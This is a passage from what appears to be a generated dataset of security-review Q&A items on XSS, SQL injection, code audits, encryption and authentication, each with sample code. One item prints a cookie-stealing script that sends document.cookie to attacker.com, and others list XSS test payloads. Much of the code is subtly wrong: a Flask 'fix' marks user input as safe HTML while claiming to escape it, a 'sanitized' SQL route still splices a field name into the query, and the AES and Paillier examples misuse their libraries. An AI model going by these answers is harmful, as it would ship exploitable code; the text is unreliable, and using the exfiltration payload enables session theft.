 try {\n    const reviewers = await Reviewer.find({ repoId: req.params.repoId });\n    res.json(reviewers);\n  } catch (err) {\n    res.status(500).json({ message: 'Error fetching reviewers' });\n  }\n});\n\nrouter.post('/codeReviewRequests/:repoId', async (req, res) => {\n  const { reviewers, message } = req.body;\n  const newRequest = new CodeReviewRequest({\n    repoId: req.params.repoId,\n    reviewers,\n    message\n  });\n\n  try {\n    await newRequest.save();\n    res.json(newRequest);\n  } catch (err) {\n    res.status(400).json({ message: err.message });\n  }\n});\n\nmodule.exports = router;\n```\nExplanation: The frontend component is a React form that allows users to select reviewers from a list fetched from the backend API and submit a code review request with a custom message. The backend Express route fetches the list of reviewers associated with a given repository ID and handles the POST request for creating a code review request. The actual logic for fetching repository details, managing users, and enforcing best practice guidelines would be more complex and involve additional routes, models, and authentication mechanisms."}, {"L2_TASK": "Security Review", "L3_TASK": "Identifying mistakes that allow for XSS injection", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: As a security expert, you've been tasked with identifying mistakes in a web application that could allow for Cross-Site Scripting (XSS) attacks. You find a piece of code that collects user input and displays it back without proper sanitization. Identify the issue and provide a corrected implementation in Python using the Flask framework.\n\nConcept: \"Web Development\"\n\n```python\nfrom flask import Flask, request, render_template\n\napp = Flask(__name__)\n\n@app.route('/display_message', methods=['POST'])\ndef display_message():\n    user_input = request.form.get('user_message')\n    # Incorrect: No sanitization or encoding\n    # return render_template('display.html', message=user_input)\n\n    # Corrected: Using Flask's `safe` filter to mark the string as safe HTML\n    safe_message = Markup(user_input)\n    return render_template('display.html', message=safe_message)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nResponse 1: The original code is vulnerable to XSS attacks because it directly displays user input, which could contain malicious scripts, without any sanitization. To fix this, we use Flask's `Markup` class from the `flask.Markup` module to escape potentially dangerous characters. In the corrected code, `safe_message` is created by passing `user_input` to `Markup`, and then `render_template` is called with `message=safe_message`, ensuring the HTML is properly encoded.\n\nQuestion 2:\nProblem: You are reviewing a JavaScript function that retrieves user input through a form and updates a page element without considering XSS vulnerabilities. Identify the problem and provide a corrected implementation that uses DOMPurify for sanitizing the input.\n\nConcept: \"Web Development\"\n\n```javascript\n// Original code with XSS vulnerability\nfunction displayComment(comment) {\n    const commentElement = document.getElementById('commentBox');\n    commentElement.innerHTML = comment;\n}\n\n// Corrected code using DOMPurify for sanitization\nconst DOMPurify = require('dompurify'); // Make sure DOMPurify is installed\nconst { sanitize } = DOMPurify;\n\nfunction displayComment(comment) {\n    const commentElement = document.getElementById('commentBox');\n    const sanitizedComment = sanitize(comment, {\n        ALLOWED_TAGS: ['b', 'i', 'p'], // Define allowed tags\n        ALLOWED_ATTR: ['class'] // Define allowed attributes\n    });\n    commentElement.innerHTML = sanitizedComment;\n}\n```\n\nResponse 2: The original JavaScript code is insecure because it sets the `innerHTML` of the `commentBox` element directly to user input, which can lead to XSS injection. The corrected code uses the DOMPurify library to sanitize the user input, allowing only specific tags and attributes that are considered safe. The `sanitize` function is called with `comment` and a configuration object specifying the allowed tags and attributes. The sanitized comment is then set to `commentElement.innerHTML`, preventing any potential XSS attacks."}, {"L2_TASK": "Security Review", "L3_TASK": "Identifying mistakes that allow for XSS injection", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: In a complex web application, a user can submit rich content that includes HTML and JavaScript. The application fails to properly sanitize user input, leaving it vulnerable to XSS (Cross-Site Scripting) attacks. Develop an advanced piece of code that demonstrates how an attacker could exploit this vulnerability, and provide a subsequent fix using a suitable language (e.g., JavaScript) to prevent XSS attacks.\n\nSolution 1:\nConcept: Security, XSS Injection\n\nAttacker's exploit (JavaScript):\n```html\n<script>\n  document.createElement('img').src = 'http://attacker.com/steal-cookie?' + encodeURIComponent(document.cookie);\n</script>\n```\nThe above code injects a script tag that sends the user's cookie information to the attacker's server.\n\nSecure code fix (JavaScript, using DOMPurify library):\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.3.3/purify.min.js\"></script>\n</head>\n<body>\n  <div id=\"content\"></div>\n\n  <script>\n    const userInput = '<script>alert(\"XSS\");</script><img src=x onerror=alert(\"XSS\")>';\n    const sanitizedContent = DOMPurify.sanitize(userInput, { FORBID_TAGS: ['script'], FORBID_ATTR: ['onerror'] });\n\n    document.getElementById('content').innerHTML = sanitizedContent;\n  </script>\n</body>\n</html>\n```\nThe secure code uses the DOMPurify library to sanitize the user input, removing any dangerous tags like `script` and attributes like `onerror` that can lead to XSS attacks.\n\nQuestion 2:\nProblem: A web application uses a custom JSON parser that incorrectly trusts user-provided JSON data, leaving it open to XSS injection. Create a sophisticated JSON payload that could exploit this vulnerability, and provide a secure implementation in a suitable language (e.g., Python) to prevent such attacks.\n\nSolution 2:\nConcept: Security, XSS Injection\n\nAttacker's payload (JSON):\n```json\n{\n  \"name\": \"<script>alert('XSS');</script>\",\n  \"profile\": \"<img src=x onerror=alert('XSS')>\",\n  \"preferences\": {\n    \"theme\": \"dark\",\n    \"notifier\": \"<iframe srcdoc=''></iframe>\"\n  }\n}\n```\nThe payload contains XSS code in the `name`, `profile`, and `notifier` fields to execute JavaScript in the user's browser.\n\nSecure code fix (Python, using `json` and `html.escape`):\n```python\nimport json\nfrom html import escape\n\ndef parse_user_json(json_data):\n    try:\n        parsed_data = json.loads(json_data)\n        sanitized_data = {}\n\n        for key, value in parsed_data.items():\n            if isinstance(value, str):\n                sanitized_data[key] = escape(value)\n            elif isinstance(value, dict):\n                sanitized_data[key] = parse_user_json(json.dumps(value))  # Recursively sanitize nested dictionaries\n            else:\n                sanitized_data[key] = value\n\n        return sanitized_data\n    except json.JSONDecodeError:\n        raise ValueError(\"Invalid JSON data\")\n\nuser_provided_json = '{\"name\": \"<script>alert(\\'XSS\\');</script>\", \"profile\": \"<img src=x onerror=alert(\\'XSS\\')>\", ...}'\nsanitized_data = parse_user_json(user_provided_json)\n\n# Now the sanitized_data dictionary is safe to use in the application\n```\nThe secure code uses Python's `json` library to parse the JSON data and `html.escape` to escape any HTML entities that might contain XSS code. The function also recursively sanitizes nested dictionaries to ensure comprehensive protection."}, {"L2_TASK": "Security Review", "L3_TASK": "SQL injection prevention", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You have been tasked with developing a web application that processes user inputs to interact with a MySQL database. A security review has identified that the current implementation is vulnerable to SQL injection attacks. Your task is to refactor the code to prevent such attacks.\n\nConcept: SQL Prepared Statements\n\nLanguage: PHP\n\nCurrent Vulnerable Code:\n```php\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";\n$result = mysqli_query($connection, $query);\n\n// Process result...\n```\nRefactored Secure Code:\n```php\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$stmt = $connection->prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");\n$stmt->bind_param(\"ss\", $username, $password);\n\n$stmt->execute();\n$result = $stmt->get_result();\n\n// Process result...\n$stmt->close();\n```\nQuestion 2:\nProblem: You are working on a Node.js application that uses a PostgreSQL database. The application currently accepts unvalidated user input to fetch data, leaving it open to SQL injection attacks. Update the code to use parameterized queries to mitigate the risk.\n\nConcept: Parameterized queries (using `pg-promise` library)\n\nLanguage: JavaScript\n\nCurrent Vulnerable Code:\n```javascript\nconst { Pool } = require('pg');\n\nconst pool = new Pool();\n\nconst getUser = (username, password) => {\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  return pool.query(query);\n};\n\n// Usage: getUser('john', 'doe');\n```\nRefactored Secure Code:\n```javascript\nconst { pgp, Pool } = require('pg-promise')();\n\nconst pool = new Pool();\n\nconst getUser = (username, password) => {\n  const sql = `SELECT * FROM users WHERE username = $1 AND password = $2`;\n  return pool.query(sql, [username, password]);\n};\n\n// Usage: getUser('john', 'doe');\n```\nIn both cases, the refactored code uses prepared statements or parameterized queries to ensure that user input is treated as data rather than executable code, thereby preventing SQL injection attacks."}, {"L2_TASK": "Security Review", "L3_TASK": "SQL injection prevention", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a robust and scalable microservice architecture that prevents SQL injection attacks while handling concurrent requests and dynamic SQL queries.\n\n**Concept**: Database Management, Security Review\n\n**Solution**: To prevent SQL injection attacks, we can use parameterized queries, input sanitization, and a microservice architecture with a middleware layer for additional security. Here's an example using Node.js and Express, with a PostgreSQL database and the `pg-promise` library.\n\nFirst, install the required libraries:\n\n```bash\nnpm install express pg-promise pg-promise-typed-config\n```\n\nCreate a `dbConfig.js` file for your database configuration:\n\n```javascript\nconst cpConfig = require('pg-promise-typed-config')({\n  host: 'localhost',\n  port: 5432,\n  database: 'your_database',\n  user: 'your_user',\n  password: 'your_password'\n});\n\nmodule.exports = cpConfig;\n```\n\nNow, develop the microservice using Express and `pg-promise`:\n\n```javascript\nconst express = require('express');\nconst pgp = require('pg-promise')();\nconst dbConfig = require('./dbConfig');\nconst app = express();\napp.use(express.json());\n\nconst db = pgp(dbConfig);\n\n// Middleware for input sanitization\nfunction sanitizeInput(req, res, next) {\n  const sanitize = (val) => (val || '').toString().trim().replace(/[-[\\]{}()*+?.,\\\\^$|#\\s]/g, '\\\\$&');\n  for (const key in req.body) {\n    req.body[key] = sanitize(req.body[key]);\n  }\n  next();\n}\n\napp.post('/dynamic-query', sanitizeInput, async (req, res) => {\n  try {\n    const query = `SELECT * FROM users WHERE ${req.body.searchField} ILIKE :searchValue`;\n    const result = await db.any(query, {\n      searchValue: `%${req.body.searchKeyword}%`\n    });\n\n    res.json(result);\n  } catch (err) {\n    console.error(err);\n    res.status(500).json({ error: 'Internal Server Error' });\n  }\n});\n\napp.listen(3000, () => console.log('Microservice is running on port 3000'));\n```\n\nThis solution demonstrates the use of a middleware function for input sanitization, parameterized queries with `pg-promise`, and a dynamic SQL query to prevent SQL injection. The microservice architecture allows for horizontal scaling to handle concurrent requests.\n\nQuestion 2: Implement a PHP-based REST API that fetches user data securely using prepared statements to prevent SQL injection, while also handling potential timing attacks.\n\n**Concept**: Database Management, Security Review, Web Development\n\n**Solution**: In this example, we'll use PHP and PDO to create a RESTful API that fetches user data securely.\n\nFirst, install PHP and the necessary extensions (e.g., PDO and PDO\\_MySQL) if they are not already installed.\n\nCreate a `config.php` file for your database configuration:\n\n```php\n<?php\n$config = [\n    'host' => 'localhost',\n    'dbname' => 'your_database',\n    'user' => 'your_user',\n    'password' => 'your_password',\n];\n?>\n```\n\nNow, create the `api.php` file for the REST API:\n\n```php\n<?php\nrequire 'config.php';\n\nheader('Content-Type: application/json');\n\ntry {\n    $pdo = new PDO(\"mysql:host=\" . $config['host'] . \";dbname=\" . $config['dbname'], $config['user'], $config['password']);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n    $pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);\n    \n    $username = $_GET['username'] ?? '';\n    \n    if (empty($username)) {\n        http_response_code(400);\n        echo json_encode(['error' => 'Invalid request']);\n        exit();\n    }\n    \n    $stmt = $pdo->prepare(\"SELECT * FROM users WHERE username = ?\");\n    $stmt->execute([$username]);\n    $user = $stmt->fetch(PDO::FETCH_ASSOC);\n    \n    if (!$user) {\n        http_response_code(404);\n        echo json_encode(['error' => 'User not found']);\n    } else {\n        echo json_encode($user);\n    }\n} catch (PDOException $e) {\n    http_response_code(500);\n    echo json_encode(['error' => 'Internal Server Error']);\n}\n?>\n```\n\nIn this solution, we use PDO with prepared statements to prevent SQL injection. By using prepared statements, the user input is treated as data, not as part of the query. Additionally, we set `ATTR_EMULATE_PREPARES` to false to mitigate potential timing attacks. Note that this solution doesn't directly address timing attacks but reduces the risk by using prepared statements. For a complete solution against timing attacks, you may need additional measures like input length validation or timing-safe comparison functions."}, {"L2_TASK": "Security Review", "L3_TASK": "Code audit for security vulnerabilities", "Complexity_Level": "medium", "Response": "Question 1: Find and fix potential SQL injection vulnerabilities in a web application using Python.\n\nConcept: SQL Injection\n\n```python\n# Before audit\ndef get_user_by_id(id_str):\n    query = f\"SELECT * FROM users WHERE id = {id_str}\"\n    cursor.execute(query)\n    return cursor.fetchone()\n\n# After audit\nimport re\nfrom django.db import DatabaseError\n\ndef get_user_by_id(id_str):\n    # Validate the input to prevent SQL injection\n    if not re.match(r'^\\d+$', id_str):\n        raise ValueError(\"Invalid ID\")\n\n    # Use parameterized query to prevent SQL injection\n    query = \"SELECT * FROM users WHERE id = %s\"\n    try:\n        cursor.execute(query, (id_str,))\n    except DatabaseError as e:\n        print(f\"Database error occurred: {e}\")\n        return None\n    return cursor.fetchone()\n```\nIn the example, the initial code is vulnerable to SQL injection as it directly embeds the user input into the SQL query. The fixed code uses a parameterized query and validates the input to ensure it's a numeric value, preventing potential SQL injection attacks.\n\nQuestion 2: Detect and mitigate cross-site scripting (XSS) vulnerabilities in a JavaScript-based web application.\n\nConcept: Cross-Site Scripting (XSS)\n\n```javascript\n// Before audit\nfunction displayUserComment(comment) {\n    const commentElement = document.createElement('div');\n    commentElement.innerHTML = comment;\n    document.getElementById('comments').appendChild(commentElement);\n}\n\n// After audit\nfunction displayUserComment(comment) {\n    const commentElement = document.createElement('div');\n    commentElement.textContent = escapeHTML(comment);\n    document.getElementById('comments').appendChild(commentElement);\n}\n\n// Helper function to escape HTML characters\nfunction escapeHTML(text) {\n    const escapeMap = {\n        '&': '&amp;',\n        '<': '&lt;',\n        '>': '&gt;',\n        '\"': '&quot;',\n        \"'\": '&#x27;'\n    };\n\n    const escapeRegex = /[&<>\"']/g;\n    return text.replace(escapeRegex, function (match) {\n        return escapeMap[match];\n    });\n}\n```\nIn this example, the initial code is vulnerable to XSS attacks because it directly inserts user-provided comment into the DOM without sanitizing it. The fixed code uses the `escapeHTML` helper function to escape potentially malicious HTML characters, preventing XSS attacks."}, {"L2_TASK": "Security Review", "L3_TASK": "Code audit for security vulnerabilities", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a solution to detect a sophisticated zero-day exploit in a complex web application using a custom JavaScript framework. The exploit involves a combination of cross-site scripting (XSS), SQL injection, and session hijacking.\n\nConcept: \"Web Security\"\n\nSolution:\nTo detect a complex zero-day exploit, a multi-layered approach is necessary, involving static code analysis, dynamic analysis, and monitoring. Here's a high-level strategy using a combination of tools and techniques in JavaScript:\n\n1. **Static Code Analysis:**\nUse a tool like ESLint with security plugins like `eslint-plugin-security` to identify potential vulnerabilities. Customize the rules to cover the custom framework's syntax.\n\n```json\n// .eslintrc.js\nmodule.exports = {\n  plugins: ['security'],\n  rules: {\n    'security/detect-object-injection': 'error',\n    'security/detect-non-literal-fs-filename': 'error',\n    'security/detect-non-literal-regexp': 'error',\n  },\n};\n```\n\n1. **Dynamic Analysis:**\nCreate a fuzz testing suite using tools like `Jest` or `Mocha` to simulate user input and test for unexpected behaviors.\n\n```javascript\n// test/fuzzer.js\nconst customInput = require('./customInputGenerator'); // generates random, potentially malicious inputs\nconst app = require('../app'); // your web application\n\ndescribe('Fuzzer', () => {\n  customInput.forEach(input => {\n    it(`should handle input ${input} without vulnerabilities`, async () => {\n      try {\n        const response = await app.handleInput(input);\n        expect(response).not.toContain('<script>');\n        expect(response).not.toMatch(/(select|insert|update|delete)/i);\n        // More checks for session integrity\n      } catch (err) {\n        console.error('Potential exploit detected:', input);\n        throw err;\n      }\n    });\n  });\n});\n```\n\n1. **Session Management:**\nImplement secure session management with tools like `express-session` and add custom middleware to detect and prevent session hijacking.\n\n```javascript\n// server.js\nconst session = require('express-session');\nconst crypto = require('crypto');\n\napp.use(session({\n  secret: 'secrethash',\n  resave: false,\n  saveUninitialized: true,\n}));\n\napp.use((req, res, next) => {\n  const sessionHash = crypto.createHash('sha256').update(JSON.stringify(req.session)).digest('hex');\n  if (req.cookies.sessionHash !== sessionHash) {\n    req.session.destroy(err => {\n      if (err) console.error(err);\n      res.clearCookie('sessionHash');\n      res.status(403).send('Session hijacking attempt detected');\n    });\n  } else {\n    res.cookie('sessionHash', sessionHash, { httpOnly: true, secure: process.env.NODE_ENV === 'production' });\n    next();\n  }\n});\n```\n\n1. **Monitoring and Logging:**\nSet up real-time monitoring using tools like `Sentry` or `Loggly` to track and analyze application errors and suspicious events.\n\n```javascript\n// errorMiddleware.js\nconst Sentry = require('@sentry/node');\n\napp.use((err, req, res, next) => {\n  Sentry.captureException(err);\n  console.error('Error:', err.message);\n  res.status(500).send('Internal Server Error');\n});\n```\n\nThis solution provides a comprehensive approach to detect a complex zero-day exploit, but it's essential to keep updating and refining the security measures as new vulnerabilities are discovered.\n\nQuestion 2: Create a solution to secure a sensitive data transfer between a client and a server using a custom encryption algorithm in a Python application.\n\nConcept: \"Network Security\"\n\nSolution:\nDesign a custom encryption algorithm (for educational purposes only, not recommended in production) and implement it in a Python client-server setup using secure socket communication.\n\n```python\nimport socket\nimport struct\nimport os\n\n# Custom encryption algorithm\ndef custom_encrypt(plaintext, key):\n    # Add complex encryption logic here\n    # This is just a placeholder\n    encrypted = plaintext.encode() ^ key.encode()\n    return encrypted\n\ndef custom_decrypt(ciphertext, key):\n    return custom_encrypt(ciphertext, key)\n\n# Server\ndef start_server(host, port, key):\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind((host, port))\n    server.listen(1)\n    print(f'Server listening on {host}:{port}')\n\n    while True:\n        client, addr = server.accept()\n        print(f'Connected by {addr}')\n        \n        try:\n            encrypted_key = client.recv(32)\n            decrypted_key = custom_decrypt(encrypted_key, key)\n            if decrypted_key != key:\n                raise ValueError('Incorrect key')\n\n            while True:\n                encrypted_data = client.recv(1024)\n                if not encrypted_data:\n                    break\n                decrypted_data = custom_decrypt(encrypted_data, key)\n                print(decrypted_data.decode())\n                \n        except Exception as e:\n            print(f'Error: {e}')\n        finally:\n            client.close()\n\n# Client\ndef start_client(host, port, key, message):\n    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client.connect((host, port))\n\n    encrypted_key = custom_encrypt(key, key)\n    client.send(encrypted_key)\n\n    encrypted_message = custom_encrypt(message, key)\n    client.send(encrypted_message)\n    client.close()\n\n# Usage\nhost = '127.0.0.1'\nport = 12345\nkey = 'secretkey123'\nmessage = 'Sensitive data to be transferred securely'\n\nstart_server(host, port, key)\nstart_client(host, port, key, message)\n```\n\nThis solution demonstrates a basic custom encryption algorithm used in conjunction with secure socket communication. In a real-world scenario, it's crucial to use established encryption standards like TLS/SSL or proper libraries like `cryptography` in Python."}, {"L2_TASK": "Security Review", "L3_TASK": "Encryption standards review", "Complexity_Level": "medium", "Response": "Question 1: Develop a program that implements AES encryption in Python using the `cryptography` library and checks if the encryption follows standard guidelines.\n\nConcept: Cryptography\n\n```python\nfrom cryptography.fernet import Fernet\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\nimport base64\n\n# Generate a 256-bit AES key\nkey = Fernet.generate_key()\n\n# Define plaintext message\nplaintext = b\"This is a secret message to be encrypted.\"\n\n# Encrypt the plaintext using AES-256 in CBC mode\nbackend = default_backend()\niv = backend.random_bytes(16)\ncipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)\nencryptor = cipher.encryptor()\nciphertext = encryptor.update(plaintext) + encryptor.finalize()\n\n# Check if the ciphertext follows standard padding (PKCS7)\npadding_size = ciphertext[-1]\nif not (1 <= padding_size <= 16 and all(ciphertext[-padding_size:] == bytes([padding_size]) * padding_size)):\n    raise ValueError(\"Invalid padding\")\n\n# Output the ciphertext and IV (base64 encoded)\nprint(\"Ciphertext:\", base64.b64encode(ciphertext))\nprint(\"IV:\", base64.b64encode(iv))\n```\n\nQuestion 2: Write a Java program to implement RSA encryption, ensuring that the key pair generation follows the standard 2048-bit key size and the encryption adheres to PKCS1 padding standards.\n\nConcept: Cryptography\n\n```java\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.SecureRandom;\nimport javax.crypto.Cipher;\nimport java.util.Base64;\n\npublic class RSAEncryptionExample {\n    public static void main(String[] args) throws Exception {\n        // Generate a 2048-bit RSA key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048, SecureRandom.getInstanceStrong());\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PublicKey publicKey = keyPair.getPublic();\n        PrivateKey privateKey = keyPair.getPrivate();\n\n        // Define plaintext message\n        String plaintext = \"This is a secret message to be encrypted using RSA.\";\n        byte[] plaintextBytes = plaintext.getBytes();\n\n        // Encrypt the plaintext using RSA with PKCS1 padding\n        Cipher cipher = Cipher.getInstance(\"RSA/ECB/PKCS1Padding\");\n        cipher.init(Cipher.ENCRYPT_MODE, publicKey);\n        byte[] ciphertextBytes = cipher.doFinal(plaintextBytes);\n\n        // Output the ciphertext (Base64 encoded)\n        String ciphertextBase64 = Base64.getEncoder().encodeToString(ciphertextBytes);\n        System.out.println(\"Ciphertext (Base64 encoded): \" + ciphertextBase64);\n    }\n}\n```\nFor both questions, the solutions demonstrate medium difficulty as they involve implementing standard encryption algorithms (AES and RSA) with proper key sizes and padding schemes."}, {"L2_TASK": "Security Review", "L3_TASK": "Encryption standards review", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop an encryption system using the Advanced Encryption Standard (AES) with a 256-bit key, while incorporating a secure key generation process, message authentication code (MAC), and ensuring resistance against side-channel attacks. The solution should be implemented in Python using the `cryptography` library.\n\nSolution:\n```python\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.primitives import hashes, hmac, padding\nfrom cryptography.hazmat.backends import default_backend\nimport secrets\nimport os\n\ndef generate_key():\n    return os.urandom(32)\n\ndef generate_auth_tag(key):\n    backend = default_backend()\n    mac = hmac.HMAC(key, hashes.SHA256(), backend)\n    mac.update(b\"authentication_data\")\n    return mac.finalize()\n\ndef encrypt(message, key):\n    nonce = os.urandom(12)\n    backend = default_backend()\n    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=backend)\n    encryptor = cipher.encryptor()\n    padder = padding.PKCS7(128).padder()\n    padded_message = padder.update(message.encode()) + padder.finalize()\n    ciphertext, tag = encryptor.update(padded_message) + encryptor.finalize()\n    return (nonce, ciphertext, tag)\n\ndef decrypt(nonce, ciphertext, tag, key):\n    backend = default_backend()\n    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=backend)\n    decryptor = cipher.decryptor()\n    padded_message = decryptor.update(ciphertext) + decryptor.finalize()\n    unpadder = padding.PKCS7(128).unpadder()\n    plaintext = unpadder.update(padded_message) + unpadder.finalize()\n    return plaintext.decode()\n\n# Example usage\nkey = generate_key()\nnonce, ciphertext, tag = encrypt(\"Secret message\", key)\nauth_key = generate_key()\ncomputed_tag = generate_auth_tag(auth_key)\n\n# Validate the tag\nif computed_tag != tag:\n    print(\"Authentication failed\")\nelse:\n    decrypted_message = decrypt(nonce, ciphertext, tag, key)\n    print(\"Decrypted message:\", decrypted_message)\n```\nConcept: Encryption standards review, AES, GCM mode, Key generation, MAC\n\nQuestion 2: Create a custom encryption algorithm using the Paillier Cryptosystem, which provides additive homomorphic properties, and implement a secure key exchange protocol based on the Diffie-Hellman key exchange. The solution should be in C++ using the `libgcrypt` library.\n\nSolution:\n```cpp\n#include <gcrypt.h>\n#include <iostream>\n#include <stdio.h>\n#include <string>\n#include <cmath>\n\nusing namespace std;\n\nvoid generate_key_pair(gcry_sexp_t* pub_key, gcry_sexp_t* priv_key) {\n    gcry_error_t error;\n    error = gcry_pk_genkey(pub_key, priv_key, \"RSA1024\");\n    if (error) {\n        cerr << \"Error generating key pair: \" << gcry_strerror(error) << endl;\n        exit(1);\n    }\n}\n\nvoid export_key(gcry_sexp_t key, string& key_str) {\n    gpg_error_t error;\n    char* key_data;\n    size_t key_data_len;\n\n    error = gcry_sexp_sprint(key, GCRY_SEXP_MODE_CANON, NULL, &key_data_len);\n    if (error) {\n        cerr << \"Error exporting key: \" << gcry_strerror(error) << endl;\n        exit(1);\n    }\n\n    key_data = new char[key_data_len];\n    error = gcry_sexp_sprint(key, GCRY_SEXP_MODE_CANON, key_data, &key_data_len);\n    if (error) {\n        cerr << \"Error exporting key: \" << gcry_strerror(error) << endl;\n        delete[] key_data;\n        exit(1);\n    }\n\n    key_str = key_data;\n    delete[] key_data;\n}\n\nvoid import_key(const string& key_str, gcry_sexp_t* key) {\n    gpg_error_t error = gcry_sexp_sscan(key, NULL, key_str.c_str(), key_str.size());\n    if (error) {\n        cerr << \"Error importing key: \" << gcry_strerror(error) << endl;\n        exit(1);\n    }\n}\n\nvoid paillier_encrypt(gcry_sexp_t pub_key, int plaintext, int& ciphertext) {\n    gcry_error_t error;\n    gcry_mpi_t m, c;\n\n    gcry_mpi_scan(&m, GCRYMPI_FMT_USG, &plaintext, 1, NULL);\n    gcry_mpi_new(&c);\n\n    error = gcry_pk_encrypt(c, m, pub_key);\n    if (error) {\n        cerr << \"Error encrypting: \" << gcry_strerror(error) << endl;\n        exit(1);\n    }\n\n    ciphertext = gcry_mpi_get_ui(c);\n    gcry_mpi_release(m);\n    gcry_mpi_release(c);\n}\n\nvoid paillier_decrypt(gcry_sexp_t priv_key, int ciphertext, int& plaintext) {\n    gcry_error_t error;\n    gcry_mpi_t m, c;\n\n    gcry_mpi_scan(&c, GCRYMPI_FMT_USG, &ciphertext, 1, NULL);\n    gcry_mpi_new(&m);\n\n    error = gcry_pk_decrypt(m, c, priv_key);\n    if (error) {\n        cerr << \"Error decrypting: \" << gcry_strerror(error) << endl;\n        exit(1);\n    }\n\n    plaintext = gcry_mpi_get_ui(m);\n    gcry_mpi_release(m);\n    gcry_mpi_release(c);\n}\n\nint main() {\n    gcry_sexp_t my_pub_key, my_priv_key, your_pub_key, shared_key;\n    string my_pub_key_str, your_pub_key_str;\n\n    // Key generation\n    generate_key_pair(&my_pub_key, &my_priv_key);\n    export_key(my_pub_key, my_pub_key_str);\n\n    // Key exchange\n    import_key(your_pub_key_str, &your_pub_key);\n    int g, p;\n    // Assuming g and p are agreed upon beforehand (DH parameters)\n    int e = pow(g, my_priv_key->data[1]->data[1], p);\n    int d = pow(your_pub_key->data[1]->data[1], my_priv_key->data[1]->data[1], p);\n    shared_key = gcry_mpi_new(200);\n    gcry_mpi_powm(shared_key, your_pub_key->data[1]->data[1], e, p);\n    int shared_key_int = gcry_mpi_get_ui(shared_key);\n\n    // Encryption and decryption\n    int plaintext = 123;\n    int ciphertext;\n    paillier_encrypt(my_pub_key, plaintext, ciphertext);\n    int decrypted_plaintext;\n    paillier_decrypt(my_priv_key, ciphertext, decrypted_plaintext);\n\n    cout << \"Decrypted plaintext: \" << decrypted_plaintext << endl;\n\n    gcry_sexp_release(my_pub_key);\n    gcry_sexp_release(my_priv_key);\n    gcry_sexp_release(your_pub_key);\n    gcry_mpi_release(shared_key);\n    return 0;\n}\n```\nConcept: Paillier Cryptosystem, Diffie-Hellman key exchange, Homomorphic encryption"}, {"L2_TASK": "Security Review", "L3_TASK": "Authentication mechanism review", "Complexity_Level": "medium", "Response": "Question 1: The application is using a basic username-password authentication system. Identify potential vulnerabilities and provide an improved solution using a more secure authentication mechanism.\n\nConcept: Authentication\n\nResponse: The current username-password system is vulnerable to various attacks, such as brute-force, dictionary attacks, and phishing. A more secure approach is to use a combination of salting, hashing, and a secure token-based authentication system like JSON Web Tokens (JWT).\n\nExample in Python (using Flask and PyJWT library):\n\n```python\nfrom flask import Flask, request, jsonify, make_response\nimport jwt\nimport bcrypt\nfrom datetime import datetime, timedelta\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'your_secret_key'\n\ndef authenticate_user(username, password):\n    # Assume this function fetches and validates user credentials from a secure database\n    user = {'id': 1, 'username': username}\n    if bcrypt.checkpw(password.encode('utf-8'), user['hashed_password']):  # Assuming hashed_password is stored in the DB\n        return user\n    return None\n\n@app.route('/login', methods=['POST'])\ndef login():\n    data = request.get_json()\n    user = authenticate_user(data['username'], data['password'])\n    if user:\n        token = jwt.encode({'user_id': user['id'], 'exp': datetime.utcnow() + timedelta(hours=1)}, app.config['SECRET_KEY'])\n        return jsonify({'access_token': token.decode('utf-8')})\n    return make_response(jsonify({'error': 'Invalid credentials'}), 401)\n\n@app.route('/protected', methods=['GET'])\ndef protected():\n    token = request.headers.get('Authorization').split(' ')[1] if request.headers.get('Authorization') else None\n    try:\n        decoded_token = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])\n        # Fetch user from the database using decoded_token['user_id']\n        user = {'id': decoded_token['user_id'], 'username': 'john_doe'}\n    except jwt.exceptions.ExpiredSignatureError:\n        return make_response(jsonify({'error': 'Token expired'}), 401)\n    except jwt.exceptions.InvalidTokenError:\n        return make_response(jsonify({'error': 'Invalid token'}), 401)\n\n    return jsonify({'message': 'Welcome, {}'.format(user['username'])})\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nQuestion 2: An application is using a third-party OAuth provider for authentication. Analyze the implementation and propose improvements to ensure security.\n\nConcept: OAuth\n\nResponse: The application should validate the OAuth tokens, use secure redirects, and properly handle access revocation. Additionally, the application must use HTTPS for all communication to protect tokens in transit.\n\nExample in Python (using Flask and Flask-Dance library for OAuth with Google):\n\n```python\nfrom flask import Flask, redirect, url_for, session\nfrom flask_dance.contrib.google import make_google_blueprint, google\nfrom flask_login import LoginManager, login_user, UserMixin, login_required, logout_user\n\napp = Flask(__name__)\napp.config['GOOGLE_OAUTH_CLIENT_ID'] = 'your_client_id'\napp.config['GOOGLE_OAUTH_CLIENT_SECRET'] = 'your_client_secret'\napp.config['SECRET_KEY'] = 'your_secret_key'\n\nlogin_manager = 